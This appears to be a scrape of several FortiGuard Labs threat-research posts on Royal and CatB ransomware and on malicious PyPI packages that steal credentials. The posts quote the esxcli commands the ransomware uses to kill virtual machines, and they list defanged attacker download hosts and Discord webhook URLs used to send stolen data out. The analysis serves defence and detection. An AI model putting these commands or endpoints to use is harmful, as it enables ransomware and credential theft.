tactics and techniques gives us better insight into how to protect against future attack scenarios. In the second half of 2022, drive-by compromise topped the list across all regions as the most common malware delivery approach. This method involves attackers gaining access to victims' systems while browsing online and getting them to download malicious payloads. Organizations should regularly patch software and use intrusion prevention system (IPS) technology to counter this popular malware delivery method. Implementing ongoing cyber-awareness training programs for employees is also critical, as end-users are typically the first line of defense against a cyberattack. As organizations' cyber defenses are improving, bad actors have their work cut out for them as they attempt to gain access to networks and evade detection. However, the growth of CaaS means that there will continue to be a high volume of increasingly sophisticated attacks—and more new variants—for security teams to contend with. To protect against cybercriminals’ growing list of tactics, organizations must focus on consolidating their security technology, reducing the number of vendors they work with to remove complexity from day-to-day operations. In the face of a growing threat landscape, security teams should also consider working with a trusted third party to conductincident response and readiness activities—like developing playbooks and conducting tabletop exercises—to ensure they’re prepared to defend the organization when an incident occurs. The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors collecting billions of threat events observed worldwide during the second half of 2022. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets.

    "title": "Royal Ransomware Targets Linux ESXi Servers",
    "link": "https://www.fortinet.com/blog/threat-research/royal-ransomware-targets-linux-esxi-servers",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has repeatedly warned organizations about ransomware developers' increased targeting of Linux systems. So it came as no surprise when it was reported that a new Royal Ransomware variant has started targeting Linux machines. In this blog post, you will learn about the technical details of this new Linux version. Affected Platforms: Linux, Unix, ESXiImpacted Users:Linux and Virtual Machine UsersImpact:Most files on the compromised machines are encrypted, including virtual machinesSeverity Level:Medium The functionality of the Linux version of Royal Ransomware looks pretty similar to the Windows version. However, it includes some additional functionality to target virtual machines. The sample we analyzed provided the following command line parameters: -id <32 character string>: A 32-character identification string added to the URL in the ransom note identifies the target. This is a compulsory parameter, and the ransomware does not run without it. -ep <percentage>: This parameter defines the portion of each targeted file to be encrypted. Many ransomware operators implement performance optimization strategies that do not encrypt an entire file, thus allowing the ransomware to run faster. In this sample, we found a straightforward implementation of such a strategy. Files smaller than 5,245,000 bytes are always encrypted 100%. For larger files, if the -ep parameter is used then plain and encrypted sections alternate in a way to reach the pre-chosen encryption percentage. -stopvm: This function stops virtual machines from running on the target system, probably to allow the ransomware to release the locking of related files and encrypt them. -vmonly: The name of this parameter indicates it only encrypts virtual machines. However, in the analyzed sample, this parameter did not do anything. This may be a feature that is currently being implemented. -fork: This parameter defines whether the main process should fork itself and allow the child process to do the rest of the work. -log: Sends logs to stdout. The Linux version's ability to interact with virtual machines seems to be the primary difference from the Windows versions. Currently, only the-stopvmfunction is implemented. However, the unfinished-vmonlyparameter indicates there is more to come. When-stopvmis chosen, the stop_vm() function (Figure 1) is called, which executes the following actions before encryption is started: 1)  It lists the virtual machines using the following shell command: esxcli vm process list > list 2)  It then opens the created file called ‘list’ and parses out the listed ‘World IDs’. 3)  In a child process, it then executes the following command with each World ID: esxcli vm process kill --type=hard --world-id=%s This process shuts down all running virtual machines, allowing the ransomware to encrypt these machines as well. The ransomware is deployed using the following command: # ./sample <target folder> -id <32 character ID> [other command line parameters] A target folder must be selected. Otherwise, the sample will exit before encryption. The sample we examined does not have a folder exclusion list, meaning that running the ransomware on the root folder with root privileges would corrupt the operating system. These attributes suggest that the ransomware is executed either manually or by a dropper program that specifies which folders should be encrypted. A simple execution flow looks like this: 1)Encryption test:The program runs an encryption test before doing anything else. This is probably a quality assurance function to ensure that file encryption will be clean and not corrupt the files. This could indicate that the threat actor is serious about the business and wants to ensure that recovery is possible. 2)Command line parameters: The program parses the command line parameters and stores their values for the rest of the execution. 3)Initializing a thread pool(Figure 2): A thread pool is created to execute encryption later. A separate thread is created for every online CPU core the machine has. Each thread runs the same thread_func() function. 4)Searching target files:search_files()function starts from the selected root directory and recursively searches for files. The exclusion list shown in Figure 3 ensures that files that were previously encrypted are not encrypted again and that the ransom note (readme) is not encrypted. The full path of allowed files is put in a queue to enqueue them for the worker threads. 5)Encryption: Threads in the thread pool monitor the queue of target files. When something is in the queue, a worker thread will pop the file from there and start encryption. The encryption is described in detail in the next section. 6)Renaming: As a final step, files are renamed to include the.royal_upostfix (Figure 4). The worker threads perform the encryption. Once a thread pops a new file from the queue, it starts the encryption process on that file as follows: 1)An RSA public key is loaded: An RSA public key was hardcoded in the sample we analyzed. The key is used to encrypt the AES keys that encrypt the files. 2)Random values are generated: For each file, a 32-byte random value is generated that serves as the AES file key and a 16-byte value that serves as the initialization vector for the AES encryption. 3)The file key is encrypted: The generated file key is encrypted using the RSA public key. 4)The file is encrypted: The file key is then used to encrypt the file using the AES CBC algorithm. If the file is bigger than 5245000 bytes (~5 MB), and the-epparameter was set, then only the preselected percentage of the file is encrypted alternatingly, as shown in Figure 5. 5)The key is concatenated to the encrypted file: Once the encryption is finished, the following three values are concatenated to the file: a.Encrypted file key: The decryptor probably loads and decrypts this key to decrypt the file content. b.Original file size: The file is resized to accommodate this additional information, thereby preserving the original file size for recovery. c.-ep value: The percentage of the file that was encrypted is also preserved for recovery. Figure 6 shows the hex dump of a file filled with 0x0 that was encrypted by the ransomware. The -ep value was set to 50% (0x32 in hexadecimal is 50% in decimal). At the end, we see the concatenated encrypted file key, the original file size, and the encryption percentage. All this information may be needed for the decryptor to decrypt this file. The ransom note (Figure 7) is dropped in every folder under the namereadme. OurFortiRecon Adversary-Centric Intelligenceservice is currently tracking 103 active victims of the Royal Ransomware group, primarily targeting the United States. This report shows that threat actors are actively pivoting to attack Linux/Unix environments. Although the sophistication of this sample is not comparable to state-of-the-art Windows ransomware—it doesn’t include defensive evasion, anti-analysis, etc.—it is still very effective. We expect further development from this actor and more ransomware operators turning towards targeting Linux systems. Fortinet customers are already protected from this malware through FortiGuard’s AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog Linux/Filecoder_Royal.A!tr FortiEDR also detects and mitigates the execution of ransomware through a combination of behavioral analysis and integration with machine learning and threat intelligence feeds.

    "title": "More Supply Chain Attacks via New Malicious Python Packages in PyPi",
    "link": "https://www.fortinet.com/blog/threat-research/more-supply-chain-attacks-via-new-malicious-python-packages-in-pypi",
    "content": "FortiGuard Labs Threat Research The FortiGuard Labs team has discovered another 0-day attack in the PyPI packages (Python Package Index) by themalware authors ‘Portugal’ and ‘Brazil’ who published the packages ‘xhttpsp’ and ‘httpssp’. These two packages were discovered on January 31, 2023, by monitoring an open-source ecosystem. They were both published on January 27, 2023. Each included one version and an empty description, as shown below. The two packages included the same malicious code in their setup.py installation script, which appears to be encoded with Base64. When we decoded the encoded string, we found python code, some of which are shown below. Within the string, we find an interesting URL, ‘http://54[.]237[.]36[.]60/inject/QrvxFGKvsSJ5E5bx', which the malware reads and then writes to a file to execute. This URL has not previously been detected by any other threat researchers. When accessing the URL, we found heavily obfuscated code, shown below. When we execute the decoded code from Figure 8, we notice that it drops a file to an arbitrary location with a random name and extension. This may be due to changes in the code every time the URL is refreshed. In this case, it drops the file to ‘%USER%\\AppData\\Local\\Temp’ as ‘yzulmvnb.jpg’ and sets a registry key for auto-run. When examining the dropped file, we observe that it is another script similar to the one shown in the URL contents. Let’s try executing this dropped file. One suspicious behavior when executing this file is that it drops a binary executable file to the ‘%USER%’ folder as ‘update.exe’. A handful of vendors flag this dropped executable file as malicious (SHA 256): 618c11e03328eb0cc47ac21964479901dfaaa8a038e4145e247374169d6528f9 As shown in Figure 14, it then runs a Powershell, which is another suspicious behavior. It also copies itself to ‘%USER%\\AppData\\Roaming\\Google’ as ‘Chrome.exe’ and sets autorun for this copied executable. When we dive into the ‘update.exe’ code, we see a binary embedded within it, as shown below. The embedded binary is a .dll file. As shown in the VirusTotal entry below, many vendors flag this binary, ‘Rdudkye.dll,’ as malicious (SHA 256): 19e9dbfe9df33f17664e780909054b48c62d3dd66e11f31f3a657d18ac4c752f While the code is very obfuscated, some functions give clues about what it may do or its capabilities. We can see some interesting functions such as DiscordApi, TelegramApi, Inject, ProcessHollowing, RemoteThreadInjection, HiddenStartup, etc. This blog shows that although the malicious python script may appear simple, it is more complex than it seems with multiple layers. With just a simple copy and paste of a brief code, malware authors are able to easily distribute malicious packages to steal or exfiltrate sensitive data through platforms such as Discord and Telegram. A good indication of a malicious package is when a lot of obfuscation is involved. This technique is quite common among malware authors, so it may be a wise idea for Python end users to check twice for this before using new packages. FortiGuard Labs notified Python Package Index administrators about this malicious package, and they have confirmed that it has been taken down. FortiGuard AntiVirus detects the malicious executables identified in this report as update.exe:MSIL/Agent.OQX!tr.dldr Rdudkye.dll:MSIL/Kryptik.AGJS!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

    "title": "Ransomware Roundup – CatB",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-catb-ransomware",
    "content": "FortiGuard Labs Threat Research This bi-weekly Ransomware Roundup report from FortiGuard Labs looks at ransomware variants that have gained traction within our datasets and the wider OSINT community. It aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against these variants. This latest edition of the Ransomware Roundup covers the CatB ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High CatB is a reasonably new entrant to the ransomware field, with samples only dating back to December 2022. However, FortiGuard Labs has also found additional samples we believe with medium confidence to be from the same threat actor owing to their using the sameBitcoinwallet. These date to November 2022. The CatB threat actor does not offer a web portal (on TOR or otherwise) to name and shame victims. Contact is only available via an e-mail address in the ransom note. As of the time of writing, there is no indication that the malware operators use a Ransomware-as-a-Service model. Information on the infection vector used by this group is not currently available. However, it’s not likely to differ significantly from those used by other ransomware groups. CatB uses a dropper packaged into a Microsoft Windows Dynamic Link Library (.dll) file. Contained within the dropper is a second .dll file that contains the payload responsible for encrypting files on the victim’s machine. This particular version of CatB uses DLL sideloading to execute the payload’s code. (DLL sideloading places a malicious DLL file in the same directory as a trusted executable. When the executable tries to load a DLL with the same name, the attacker’s DLL is loaded instead.) Execution of the dropper is accomplished using the Windows “rundll32.exe” application. The dropper is packed using UPX, which unpacks the file and executes the code inside. Once the primary code executes, CatB creates an array of barriers to prevent analysis and execution on virtual machines/sandboxes. To validate that the malware has been loaded on a legitimate target, each barrier must be met before the payload is dropped and executed. Among the first of these is a check for the number of processors on the system. Given that most modern physical Windows devices are multi-processor/multi-core computers, there must be at least two to continue. In addition to multi-core processors, most current systems have more than 2GB of RAM installed. Figure 4 above shows a comparison being made to the value of 800 in hexadecimal. In decimal, this corresponds to 2048 or 2GB. The value must be this or greater to continue. The next test involves the hard disk. Most virtual machines are created with just enough resources to do their intended job, while a physical device will have much more. The dropper attempts to validate that the hard disk on the machine meets certain criteria. It uses the API call “DeviceIOControl” to determine this by passing a value of 70000 in hexadecimal. This corresponds to 458752, which is the control code for IOCTL_DISK_GET_DRIVE_GEOMETRY.  This provides a mechanism to obtain information on a physical disk (e.g. tracks, sectors and cylinders). If all checks pass, the dropper creates the file “oci.dll”. As mentioned, this version of CatB uses DLL sideloading to execute the payload in “oci.dll”. To do this, theMicrosoft Distributed Transaction Coordinator(MSDTC) service is used to facilitate the process. As MSTDC starts, it reads several DLLs from “C:\\windows\\system32”, which now contains the malicious version of “oci.dll”. CatB alters the username of the service to “LocalSystem” and then starts MSDTC. Even if one anti-VM check fails, MSDTC will still be started. However, it will quickly be followed by a termination event, thereby ending the execution of CatB. Otherwise, “oci.dll” begins its run to encrypt the host system. CatB looks for files to encrypt beyond just the “C:\\” drive, enumerating additional mounted hard drive volumes up to “I”. The ransomware will not encrypt anything that might be considered a functional system file that would prevent a possible recovery (and thereby eliminate any reason to pay a ransom). Interestingly, CatB does not deploy a ransom note in an obvious location (e.g., the user’s desktop) as other ransomware strains do. Instead, every encrypted file has the ransom note prepended to the top of the file. As shown in figures 11 and 12, the ransom demanded is steep at 50BTC on day 1. This is approximately $1,102,010.00 (as of the date of this writing). The cost escalates daily until day five, when it indicates that data will no longer be recoverable. The Bitcoin address used in this sample, along with similar ransomware samples FortiGuard Labs has found, had no funds at the time of writing. As mentioned earlier, the only contact method available is through the attacker’s Proton Mail address. Fortinet customers are already protected from this malware variant as follows: FortiGuard Labs detects known CatB ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

The first thing we notice in its setup.py is what looks like a webhook URL: hxxps://discord[.]com/api/webhooks/1069214746395562004/sejnJnNA3lWgkWC4V86RaFzaiUQ3dIAG958qwAUkLCkYjJ7scZhoa-KkRgBOhQw8Ecqd Each package includes similar code in their setup.py except for the webhook URL. Examining the URL shows it may be related to a “Spidey Bot” malware known to steal personal information through Discord, as seen in our previous blog about the packageweb3-essential. When we perform a static analysis by looking through its setup.py script, we spot several potential malicious behaviors, described below. Note that all the figures are from setup.py. Looking at the primary function, we get a general idea of malware behavior that may try to retrieve sensitive information from different browsers and Discord and save it to a file for exfiltration. Let’s look at the ‘getPassw’ function, for example. Below, it attempts to gather user and password information from the browsers listed in Figure 6 and then save it to a text file. The list of websites in Figure 8 may be used for retrieving the information mentioned earlier. We also see that the malware names itself ‘Fade Stealer,’ which can be seen when it writes its name at the top of its text file. Similar behavior is found in its ‘getCookie’ function. Looking at the ‘upload’ function, we can see clear clues about what it may do, such as using the webhook URL to steal files and data, as discussed above. From the functions ‘Kiwi’, ‘KiwiFile’, and ‘uploadToAnonfiles’, we can safely assume that it looks through specific folders and picks up specific file names for file transfer through the file-sharing site ‘https://transfer.sh/’. Many of these keywords are related to logins, accounts, banks, etc. In this blog, a single malware author published several packages with entirely different names but with similar codes designed to launch attacks. The malware authors can executemalicious attackswith a single python script, such as stealing sensitive information using webhooks on Discord.

    "title": "Supply Chain Attack by New Malicious Python Package, “web3-essential”",
    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-by-new-malicious-python-package-web3-essential",
    "content": "FortiGuard Labs Threat Research The FortiGuard Labs team has discovered another new 0-day attack in a PyPI package (Python Package Index) called “web3-essential”. It was discovered on January 30, 2023, by monitoring an open-source ecosystem. The package was published on January 26, 2023, the same day as its author, ‘Trexon’, joined the repository. Given the frequency of this pattern of simultaneously joining and publishing, it may be a wise idea to take precautions for downloading packages published by newly joined authors. The author included a brief description of the project along with a unique version number of ‘1.0.4b0’ as if to try and avoid suspicion. The package includes malicious code in its setup.py installation script that downloads and runs an executable file as a part of its installation. The interesting element is the URL, which requires deeper analysis: hxxps://cdn[.]discordapp[.]com/attachments/1068100530498449468/1068239485613125702/ily[.]exe As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256): 43c89b9263f78ef870bf205e92f7912c8b2845d33391b46cd747d45a5632aea0. While this download URL is only detected by one vendor, a few vendors do flag the downloaded executable file as malicious. The downloaded executable seems to be a Go-compiled executable file. Let’s try running it. One suspicious behavior conducted by ‘ily.exe’ is that it creates DB files in the ‘%USER%\\AppData\\Local\\cloudflare-warp-cache\\raw\\’ folder. This may be used for recording sensitive user data and credentials. Let’s take a look at the DB files below. We can safely assume they will be used for saving sensitive data and credentials, such as credit card and log-in information. When we take a look inside the binary using IDA, we see many strings that raise suspicions. We can also get some clues about the malware behavior by observing these. Some keywords of interest include, ‘virus’, ‘wallets’, ‘browsers’, ‘login’, and ‘passwords’. Below we can also see some strings with ‘.zip’ for several browser names which could be indication of saving the sensitive information as a zip file. The examples in the code shown below are of the browsers that the malware takes an interest in. We also found an interesting URL embedded in the code: hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy It uses a Go package, ‘dishooks’, which is a Discord webhook API wrapper. Within the URL, we see that it may be related to a “Spidey Bot” malware which is known to steal personal information through Discord. In this blog, we saw a new author upload a malicious package on the same day as they joined. This package included a very simple python script that leads to downloading a malicious binary executable designed to steal sensitive information like credit cards and logins. In our previous blogs looking at malicious PyPI packages, we have observed that malware authors commonly behave in this way. We have also learned that these malicious executable are also frequently compiled using a variety of compilers, such as Go-compiler or PyInstaller, etc. Python Package Index administrators have confirmed that after notification by FortiGuard Labs, this package has been taken down.FortiGuard AntiVirus detects the malicious executables identified in this report as ily.exe:W64/Stealer.679E!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.
